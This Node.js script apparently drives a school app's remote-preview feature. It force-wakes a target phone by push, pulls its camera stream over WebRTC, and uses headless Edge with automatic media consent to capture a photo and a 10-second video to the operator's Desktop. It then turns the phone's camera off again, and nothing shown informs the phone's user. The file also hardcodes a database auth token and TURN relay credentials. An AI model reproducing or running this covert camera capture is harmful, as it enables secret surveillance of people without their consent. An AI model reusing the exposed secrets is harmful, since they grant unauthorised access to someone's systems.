const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn } = require('child_process');
const { createClient } = require('@libsql/client');

const client = createClient({
  url: 'https://tapowan-v2-tapowan.aws-ap-south-1.turso.io',
  authToken: 'eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJhIjoicnciLCJpYXQiOjE3ODkwOTIyMTUsImlkIjoiMDFhMDhlMzQtODMwMS03MDI0LTk5ZWQtMGQ0MmYwMGJiNjFlIiwia2lkIjoiVFRPdk5ISlFYZVAtX1FsNG9ZUXM4cTBTYXRiZzJ1UmVhYjlUbjFyem1tcyIsInJpZCI6ImVjNjc2YzExLTRhNGUtNGZhNi1hMTM1LTJmZDk4YTIxNzliMSJ9.RmzczPOvgV3Hd83byF7fMfQsCzlJnF8r9MCGtzTfZDj8k--VqtItniZN5GCiPfv4-dCEmDZaIWDGPOnM-EknDA'
});

const TARGET_DEVICE = process.argv[2] || 'dev_mutvcl8n_qff9f5';
const PORT = 8765;
const WAKE_API = 'https://tapowan-school.vercel.app/api/calls/remote-preview/wake';

let activePreviewId = '';
let activeOfferSdp = '';
let activeTargetIce = '';
let browserProc = null;
let serverInstance = null;
const tempProfile = path.join(os.tmpdir(), 'edge_bot_profile_' + Date.now());

const HTML_CONTENT = `<!DOCTYPE html>
<html>
<head><title>WebRTC Auto Capture</title></head>
<body style="background:#0f172a;color:#f8fafc;font-family:sans-serif;padding:24px;">
  <h2 style="color:#38bdf8;">📹 Live WebRTC Stream Capture Bot</h2>
  <div id="status" style="font-size:18px;color:#4ade80;font-weight:bold;">Connecting to session...</div>
  <video id="remoteVid" autoplay playsinline muted style="width:480px;height:360px;background:#000;border:2px solid #38bdf8;margin-top:12px;border-radius:8px;object-fit:contain;"></video>
  <canvas id="snapCanvas" style="display:none;"></canvas>
  <div id="logs" style="font-family:monospace;margin-top:16px;white-space:pre-wrap;color:#94a3b8;font-size:13px;"></div>

  <script>
    const log = (msg) => {
      document.getElementById('logs').textContent += msg + '\\n';
      console.log(msg);
      fetch('/api/log', { method: 'POST', body: msg }).catch(() => {});
    };
    const setStatus = (msg) => {
      document.getElementById('status').innerText = msg;
      log('STATUS: ' + msg);
    };

    const iceConfig = {
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' },
        { urls: 'stun:stun.cloudflare.com:3478' },
        { urls: 'stun:stun.relay.metered.ca:80' },
        {
          urls: [
            'turn:global.relay.metered.ca:80',
            'turn:global.relay.metered.ca:80?transport=tcp',
            'turn:global.relay.metered.ca:443',
            'turn:global.relay.metered.ca:443?transport=tcp',
            'turns:global.relay.metered.ca:443?transport=tcp',
            'turn:172.237.33.131:80',
            'turn:172.237.33.131:80?transport=tcp',
            'turn:172.237.33.131:443',
            'turn:172.237.33.131:443?transport=tcp',
            'turn:45.79.127.179:80',
            'turn:45.79.127.179:80?transport=tcp',
            'turn:45.79.127.179:443',
            'turn:45.79.127.179:443?transport=tcp'
          ],
          username: 'df50426e5dfce9fa2ceb4146',
          credential: 'J8bvaMKOvira9QLL'
        }
      ],
      iceCandidatePoolSize: 6,
      bundlePolicy: 'max-bundle',
      rtcpMuxPolicy: 'require',
      iceTransportPolicy: 'all'
    };

    async function initWebRTC() {
      setStatus('Fetching session data from server...');
      const sRes = await fetch('/api/session');
      const session = await sRes.json();
      log('Session: previewId=' + session.previewId + ', offerLen=' + session.offerSdp.length);

      const pc = new RTCPeerConnection(iceConfig);
      const vid = document.getElementById('remoteVid');
      let streamCaptured = false;

      pc.ontrack = (event) => {
        log('🎥 ontrack event fired: ' + event.track.kind);
        const stream = event.streams?.[0] || new MediaStream([event.track]);
        vid.srcObject = stream;
        vid.play().catch(e => log('Autoplay note: ' + e.message));
      };

      const viewerIce = [];
      pc.onicecandidate = (event) => {
        if (event.candidate) {
          viewerIce.push(event.candidate.toJSON());
          fetch('/api/viewer-ice', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ice: viewerIce })
          }).catch(() => {});
        }
      };

      pc.oniceconnectionstatechange = () => {
        log('ICE Connection State: ' + pc.iceConnectionState);
        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
          if (!streamCaptured) {
            streamCaptured = true;
            handleActiveStream(vid.srcObject, vid);
          }
        }
      };

      await pc.setRemoteDescription(new RTCSessionDescription({
        type: 'offer',
        sdp: session.offerSdp
      }));
      log('Remote offer description set successfully');

      if (session.targetIce) {
        try {
          const list = JSON.parse(session.targetIce);
          log('Adding ' + list.length + ' initial target ICE candidates');
          for (const c of list) {
            await pc.addIceCandidate(new RTCIceCandidate(c)).catch(() => {});
          }
        } catch (_) {}
      }

      const answer = await pc.createAnswer();
      await pc.setLocalDescription(answer);
      log('Created local Answer SDP (' + answer.sdp.length + ' chars)');

      await fetch('/api/answer', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ answerSdp: answer.sdp })
      });
      setStatus('Answer sent! Establishing WebRTC media link...');

      // Fallback timer: if ICE state doesn't reach connected in 8s but video is playing
      setTimeout(() => {
        if (!streamCaptured && vid.srcObject) {
          streamCaptured = true;
          handleActiveStream(vid.srcObject, vid);
        }
      }, 8000);

      // Poll any subsequent ICE candidates
      const icePoll = setInterval(async () => {
        if (streamCaptured) { clearInterval(icePoll); return; }
        const r = await fetch('/api/target-ice');
        const d = await r.json();
        if (d && d.targetIce) {
          try {
            const cList = JSON.parse(d.targetIce);
            for (const c of cList) {
              await pc.addIceCandidate(new RTCIceCandidate(c)).catch(() => {});
            }
          } catch (_) {}
        }
      }, 1000);
    }

    async function handleActiveStream(stream, vid) {
      setStatus('🟢 Live camera link connected! Decoding video frames...');
      for (let i = 0; i < 25; i++) {
        if (vid.videoWidth > 0 && vid.readyState >= 2) break;
        await new Promise(r => setTimeout(r, 400));
      }
      log('Decoded frame size: ' + vid.videoWidth + 'x' + vid.videoHeight);

      // Wait 1.5 seconds for auto-exposure and frame stabilization
      await new Promise(r => setTimeout(r, 1500));

      // ── Step 1: Capture Photo Frame ──
      setStatus('📸 Capturing high-resolution photo snapshot...');
      const canvas = document.getElementById('snapCanvas');
      canvas.width = vid.videoWidth || 640;
      canvas.height = vid.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
      const photoDataUrl = canvas.toDataURL('image/jpeg', 0.95);
      log('Photo snapshot captured successfully (' + photoDataUrl.length + ' chars)');

      await fetch('/api/save-photo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ photoBase64: photoDataUrl })
      });
      log('✅ Photo written to Desktop!');

      // ── Step 2: Record 10-Second Live Video ──
      setStatus('🎬 Recording 10-second live video clip...');
      const recordStream = (vid.captureStream ? vid.captureStream(30) : (stream || vid.srcObject));
      let recorder;
      try {
        recorder = new MediaRecorder(recordStream, { mimeType: 'video/webm;codecs=vp8' });
      } catch (_) {
        recorder = new MediaRecorder(recordStream);
      }

      const chunks = [];
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) chunks.push(e.data);
      };

      recorder.onstop = async () => {
        setStatus('💾 Uploading 10s video recording to server...');
        const blob = new Blob(chunks, { type: 'video/webm' });
        log('Recorded video blob size: ' + blob.size + ' bytes');

        const arrayBuf = await blob.arrayBuffer();
        await fetch('/api/save-video', {
          method: 'POST',
          headers: { 'Content-Type': 'application/octet-stream' },
          body: arrayBuf
        });

        setStatus('🎉 ALL DONE! Photo and 10s video saved successfully to Desktop!');
        log('Recording complete. Notifying server to finish.');
        await fetch('/api/complete', { method: 'POST' });
      };

      recorder.start(1000); // 1-second chunks
      log('MediaRecorder started recording...');

      let countdown = 10;
      const timer = setInterval(() => {
        countdown--;
        setStatus('🎬 Recording 10s video... (' + countdown + 's remaining)');
        if (countdown <= 0) {
          clearInterval(timer);
          recorder.stop();
        }
      }, 1000);
    }

    window.onload = initWebRTC;
  </script>
</body>
</html>`;

const server = http.createServer(async (req, res) => {
  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML_CONTENT);
    return;
  }

  if (req.method === 'GET' && req.url === '/api/session') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      previewId: activePreviewId,
      offerSdp: activeOfferSdp,
      targetIce: activeTargetIce
    }));
    return;
  }

  if (req.method === 'GET' && req.url === '/api/target-ice') {
    try {
      const r = await client.execute({
        sql: 'SELECT target_ice FROM app_device_previews WHERE preview_id = ?',
        args: [activePreviewId]
      });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ targetIce: r.rows?.[0]?.target_ice || '' }));
    } catch (e) {
      res.writeHead(500); res.end(e.message);
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/answer') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', async () => {
      try {
        const { answerSdp } = JSON.parse(body);
        await client.execute({
          sql: "UPDATE app_device_previews SET answer_sdp = ?, status = 'answering', updated_at = datetime('now') WHERE preview_id = ?",
          args: [answerSdp, activePreviewId]
        });
        console.log('✅ Answer SDP successfully written to Turso database!');
        res.writeHead(200); res.end('OK');
      } catch (e) {
        console.error('Answer write error:', e);
        res.writeHead(500); res.end(e.message);
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/viewer-ice') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', async () => {
      try {
        const { ice } = JSON.parse(body);
        await client.execute({
          sql: 'UPDATE app_device_previews SET viewer_ice = ?, updated_at = datetime("now") WHERE preview_id = ?',
          args: [JSON.stringify(ice), activePreviewId]
        });
        res.writeHead(200); res.end('OK');
      } catch (e) {
        res.writeHead(500); res.end(e.message);
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/log') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      console.log('📱 [Bot]:', body);
      res.writeHead(200); res.end('OK');
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/save-photo') {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => {
      try {
        const { photoBase64 } = JSON.parse(body);
        const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
        const buf = Buffer.from(base64Data, 'base64');
        const outPath = 'C:\\Users\\Admin\\Desktop\\live_camera_snapshot.jpg';
        fs.writeFileSync(outPath, buf);
        console.log('📸 Photo successfully saved to:', outPath, '(' + buf.length + ' bytes)');
        res.writeHead(200); res.end('OK');
      } catch (e) {
        console.error('Error saving photo:', e);
        res.writeHead(500); res.end(e.message);
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/save-video') {
    const chunks = [];
    req.on('data', c => c && chunks.push(c));
    req.on('end', () => {
      try {
        const buf = Buffer.concat(chunks);
        const outPath = 'C:\\Users\\Admin\\Desktop\\live_camera_10sec_video.webm';
        fs.writeFileSync(outPath, buf);
        console.log('🎬 10-second video successfully saved to:', outPath, '(' + buf.length + ' bytes)');
        res.writeHead(200); res.end('OK');
      } catch (e) {
        console.error('Error saving video:', e);
        res.writeHead(500); res.end(e.message);
      }
    });
    return;
  }

  if (req.method === 'POST' && req.url === '/api/complete') {
    console.log('🎉 Recording complete signal received!');
    res.writeHead(200); res.end('OK');

    // Send camera_off command to return phone to sleep
    fetch(WAKE_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        previewId: 'cmd_camera_off_' + activePreviewId,
        targetDeviceId: TARGET_DEVICE,
        command: 'camera_off'
      })
    }).catch(() => {});

    setTimeout(() => {
      if (browserProc) try { browserProc.kill(); } catch (_) {}
      try { fs.rmSync(tempProfile, { recursive: true, force: true }); } catch (_) {}
      if (serverInstance) {
        serverInstance.close(() => {
          console.log('Capture server finished. Exiting.');
          process.exit(0);
        });
      }
    }, 2000);
    return;
  }

  res.writeHead(404); res.end('Not Found');
});

async function main() {
  serverInstance = server.listen(PORT, async () => {
    console.log(`Server listening on http://localhost:${PORT}`);
    activePreviewId = 'pv_bot_' + Date.now().toString(36);
    console.log(`Target device: ${TARGET_DEVICE}, previewId: ${activePreviewId}`);

    // 1. Insert requesting record into Turso DB
    console.log('Step 1: Inserting requesting record into Turso DB...');
    await client.execute({
      sql: "INSERT INTO app_device_previews (preview_id, viewer_device_id, target_device_id, status, created_at, updated_at) VALUES (?, 'web_admin', ?, 'requesting', datetime('now'), datetime('now'))",
      args: [activePreviewId, TARGET_DEVICE]
    });

    // 2. Dispatch FCM wake push with force=true
    console.log('Step 2: Dispatching high-priority wake push...');
    const wakeRes = await fetch(WAKE_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        previewId: activePreviewId,
        targetDeviceId: TARGET_DEVICE,
        viewerName: 'Capture Bot',
        force: true
      })
    });
    const wakeJson = await wakeRes.json();
    console.log('Wake push dispatched:', wakeJson);

    // 3. Poll for SDP offer from the target phone
    console.log('Step 3: Waiting for phone to generate SDP Offer...');
    for (let i = 0; i < 40; i++) {
      await new Promise(r => setTimeout(r, 1000));
      const res = await client.execute({
        sql: 'SELECT offer_sdp, target_ice, status FROM app_device_previews WHERE preview_id = ?',
        args: [activePreviewId]
      });
      const row = res.rows?.[0];
      if (row && row.offer_sdp) {
        console.log(`🎉 SDP Offer received at ${i + 1}s! Length: ${row.offer_sdp.length}`);
        activeOfferSdp = row.offer_sdp;
        activeTargetIce = row.target_ice || '';
        break;
      }
      process.stdout.write('.');
    }

    if (!activeOfferSdp) {
      console.error('\n❌ Timed out waiting for SDP Offer from device.');
      serverInstance.close();
      process.exit(1);
    }

    // 4. Launch headless Edge to connect to the session
    console.log('\nStep 4: Launching headless browser to capture photo and 10s video...');
    const edgePath = 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe';
    browserProc = spawn(edgePath, [
      '--headless=new',
      '--use-fake-ui-for-media-stream',
      '--no-sandbox',
      '--autoplay-policy=no-user-gesture-required',
      `--user-data-dir=${tempProfile}`,
      `http://localhost:${PORT}`
    ]);

    browserProc.on('error', err => {
      console.error('Failed to launch browser:', err);
    });
  });
}

main().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});

// 90s safety timeout
setTimeout(() => {
  console.log('Global safety timeout (90s) reached.');
  if (browserProc) try { browserProc.kill(); } catch (_) {}
  try { fs.rmSync(tempProfile, { recursive: true, force: true }); } catch (_) {}
  if (serverInstance) serverInstance.close();
  process.exit(0);
}, 90000);
